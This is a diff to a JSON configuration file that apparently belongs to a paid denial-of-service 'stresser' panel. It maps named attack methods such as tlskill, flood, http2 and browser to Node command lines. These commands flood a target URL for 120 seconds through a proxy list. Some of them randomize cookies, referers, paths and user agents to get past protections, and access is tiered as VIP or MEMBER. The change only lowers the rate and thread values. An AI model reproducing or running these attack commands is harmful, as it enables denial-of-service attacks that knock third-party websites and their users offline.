@@ -1,42 +1,42 @@
 {
     "httpmix": {
-        "command": "node --max-old-space-size=65536 httpmix POST \"url\" 120 10 128 live.txt --query 1 --delay 1 --cookie \"bypassing=%RAND%\" --referer rand --http mix --close --randpath --parsed --reset --multipath 5 --header \"User-Agent: Mozilla/5.0#Accept: */*\" --ua \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\" --header \"Authorization: Bearer token123#X-Custom-Header: value123\"",
+        "command": "node --max-old-space-size=65536 httpmix POST \"url\" 120 5 128 live.txt --query 1 --delay 1 --cookie \"bypassing=%RAND%\" --referer rand --http mix --close --randpath --parsed --reset --multipath 5 --header \"User-Agent: Mozilla/5.0#Accept: */*\" --ua \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\" --header \"Authorization: Bearer token123#X-Custom-Header: value123\"",
         "url": "url",
         "time": 120,
         "visibility": "VIP"
     },
     "tlskill": {
-        "command": "node --max-old-space-size=65536 tlskill url 120 10 10 live.txt",
+        "command": "node --max-old-space-size=65536 tlskill url 120 5 5 live.txt",
         "url": "url",
         "time": 120,
         "visibility": "VIP"
     },
     "flood": {
-        "command": "node --max-old-space-size=65536 flood url 120 10 10 live.txt flood",
+        "command": "node --max-old-space-size=65536 flood url 120 5 5 live.txt flood",
         "url": "url",
         "time": 120,
         "visibility": "VIP"
     },
     "http2": {
-        "command": "node --max-old-space-size=65536 http2 url 120 10 10 live.txt --redirect true --ratelimit true --query true",
+        "command": "node --max-old-space-size=65536 http2 url 120 5 5 live.txt --redirect true --ratelimit true --query true",
         "url": "url",
         "time": 120,
         "visibility": "MEMBER"
     },
     "http1": {
-        "command": "node --max-old-space-size=65536 http1 POST url live.txt 120 10 10 cookie= randomstring= headerdata= postdata=",
+        "command": "node --max-old-space-size=65536 http1 POST url live.txt 120 5 5 cookie= randomstring= headerdata= postdata=",
         "url": "url",
         "time": 120,
         "visibility": "MEMBER"
     },
     "get": {
-        "command": "node --max-old-space-size=65536 get GET \"url\" 120 10 128 live.txt --query 1 --delay 1 --cookie \"bypassing=%RAND%\" --referer rand --http mix --close --randpath --parsed --reset --multipath \"path1@path2@path3@path4@path5\" --header \"User-Agent: Mozilla/5.0#Accept: */*\" --ua \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\" --header \"Authorization: Bearer token123#X-Custom-Header: value123\"",
+        "command": "node --max-old-space-size=65536 get GET \"url\" 120 5 128 live.txt --query 1 --delay 1 --cookie \"bypassing=%RAND%\" --referer rand --http mix --close --randpath --parsed --reset --multipath \"path1@path2@path3@path4@path5\" --header \"User-Agent: Mozilla/5.0#Accept: */*\" --ua \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\" --header \"Authorization: Bearer token123#X-Custom-Header: value123\"",
         "url": "url",
         "time": 120,
         "visibility": "MEMBER"
     },
     "browser": {
-        "command": "node --max-old-space-size=65536 browser url 120 10 10 live.txt",
+        "command": "node --max-old-space-size=65536 browser url 120 5 5 live.txt",
         "url": "url",
         "time": 120,
         "visibility": "MEMBER"
